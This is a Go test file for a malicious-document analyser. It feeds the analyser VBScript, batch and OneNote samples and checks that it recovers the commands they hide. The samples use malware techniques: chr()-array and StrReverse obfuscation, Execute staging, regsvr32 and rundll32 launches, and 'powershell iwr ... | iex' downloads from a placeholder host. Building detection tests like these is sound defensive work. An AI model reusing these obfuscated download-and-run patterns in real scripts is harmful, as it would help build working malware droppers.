package maldoctrace

import (
	"context"
	"strings"
	"testing"

	"github.com/debugactiveprocess/MaldocTrace/report"
)

// allCommands collects the command lines of a report and its children.
func allCommands(r *report.Report) []string {
	var out []string
	for _, c := range r.Commands {
		out = append(out, c.CommandLine)
	}
	for _, ch := range r.Children {
		out = append(out, allCommands(ch.Report)...)
	}
	return out
}

func hasCommand(r *report.Report, sub string) bool {
	for _, c := range allCommands(r) {
		if strings.Contains(strings.ToLower(c), strings.ToLower(sub)) {
			return true
		}
	}
	return false
}

func TestVBScriptTopLevelAndPublic(t *testing.T) {
	// "a:b" is two calls in VBScript (there are no labels); a Public
	// variable set inside a function keeps its value.
	src := "public x, target, y\r\nsetit:CreateObject(\"WScript.Shell\").Run (\"cmd /c \" & target),0,true\r\n" +
		"function setit\r\ntarget = \"rundll32 \" & WScript.ScriptName\r\nend function\r\n"
	r := AnalyzeVBScript(context.Background(), src, "a.vbs", Options{})
	if !hasCommand(r, "cmd /c rundll32 script.vbs") {
		t.Fatalf("commands %v diags %+v", allCommands(r), r.Diagnostics)
	}
}

func TestVBScriptExecute(t *testing.T) {
	src := "x = \"\"\r\nfor each c in Array(67,114,101,97,116,101,79,98,106,101,99,116)\r\nx = x & chr(c)\r\nnext\r\n" +
		"code = x & \"(\"\"WScript.Shell\"\").Run \"\"powershell -nop -c iwr http://example.invalid/p\"\"\"\r\n" +
		"Execute code\r\n"
	r := AnalyzeVBScript(context.Background(), src, "e.vbs", Options{})
	if !hasCommand(r, "powershell -nop -c iwr http://example.invalid/p") {
		t.Fatalf("commands %v diags %+v", allCommands(r), r.Diagnostics)
	}
}

func TestVBScriptSpeculativeBranch(t *testing.T) {
	// The payload only runs when the downloaded file is large enough: the
	// size is unknown, so the branch is explored speculatively.
	src := "Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\n" +
		"p = fso.GetSpecialFolder(2) & \"\\\" & fso.GetTempName\r\n" +
		"Set f = fso.GetFile(p)\r\nIf f.Size > 400 Then\r\nCreateObject(\"WScript.Shell\").Run \"regsvr32.exe \" & p, 0\r\nEnd If\r\n"
	r := AnalyzeVBScript(context.Background(), src, "s.vbs", Options{})
	if !hasCommand(r, "regsvr32.exe %TEMP%\\rad5F3A1.tmp") {
		t.Fatalf("commands %v diags %+v", allCommands(r), r.Diagnostics)
	}
	spec := false
	for _, e := range r.Events {
		spec = spec || e.Type == "wscript_shell_run" && e.Speculative
	}
	if !spec {
		t.Fatal("branch event not marked speculative")
	}
}

func TestOneNoteVBScriptStages(t *testing.T) {
	// Stage 1 writes a second script under an .html name and runs it with
	// //E:vbscript; stage 2 rebuilds the command with Execute.
	stage1 := "Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\n" +
		"p = fso.GetSpecialFolder(2) & \"\\x.html\"\r\n" +
		"Set f = fso.CreateTextFile(p, True)\r\n" +
		"f.WriteLine(\"c = StrReverse(\"\"exe.clac c/ dmc\"\")\")\r\n" +
		"f.WriteLine(\"Execute \"\"CreateObject(\"\"\"\"WScript.Shell\"\"\"\").Run c\"\"\")\r\n" +
		"f.Close\r\n" +
		"CreateObject(\"WScript.Shell\").Run \"wscript //E:vbscript \" & p, 0, False\r\n"
	data := append(append([]byte(nil), oneMagic...), make([]byte, 64)...)
	data = append(data, oneFile([]byte(stage1))...)
	r := AnalyzeFromBytes(context.Background(), data, "invoice.one", Options{})
	if r.Verdict != "malicious" {
		t.Fatalf("verdict %s %v", r.Verdict, r.VerdictReasons)
	}
	if !hasCommand(r, "wscript //E:vbscript %TEMP%\\x.html") || !hasCommand(r, "cmd /c calc.exe") {
		t.Fatalf("commands %v", allCommands(r))
	}
	if len(r.Children) != 1 || r.Children[0].Source != "script_emulation" ||
		len(r.Children[0].Report.Children) != 1 || r.Children[0].Report.Children[0].Source != "script_stage" {
		t.Fatalf("stages %+v", r.Children)
	}
}

func TestOneNoteObfuscatedBatch(t *testing.T) {
	bat := "JUNK HEADER LINE >nul 2>&1\r\n@echo off\r\nset a=po\r\n:: noise\r\nset \"b=wer\"\r\nset s= \r\nset c=xxshellxx\r\n" +
		"set u=http://example.invalid/AAA/p.ps1\r\n" +
		"%a%%b%%c:~2,5%%s%-c iwr %u:AAA=dl%^|iex\r\n" +
		"%undefined%rundll32%s%%TEMP%\\x.dll,#1\r\n"
	data := append(append([]byte(nil), oneMagic...), make([]byte, 64)...)
	data = append(data, oneFile([]byte(bat))...)
	r := AnalyzeFromBytes(context.Background(), data, "invoice.one", Options{})
	if len(r.Artifacts) != 1 || r.Artifacts[0].FileType != "batch script" {
		t.Fatalf("artifacts %+v", r.Artifacts)
	}
	if !hasCommand(r, "powershell -c iwr http://example.invalid/dl/p.ps1|iex") || !hasCommand(r, `rundll32 %TEMP%\x.dll,#1`) {
		t.Fatalf("commands %v", allCommands(r))
	}
	if !hasIOCType(r, "url", "http://example.invalid/dl/p.ps1") {
		t.Fatalf("iocs %+v", r.Indicators)
	}
}

func FuzzAnalyzeVBScript(f *testing.F) {
	f.Add("a:b:Execute \"x = 1 : Execute \"\"Execute y\"\"\"\r\nfunction a\r\nend function\r\nCreateObject(\"WScript.Shell\").Run (c),0,true")
	f.Fuzz(func(t *testing.T, s string) {
		if len(s) > 4096 {
			return
		}
		_ = AnalyzeVBScript(context.Background(), s, "f.vbs", Options{Timeout: 2e9})
	})
}
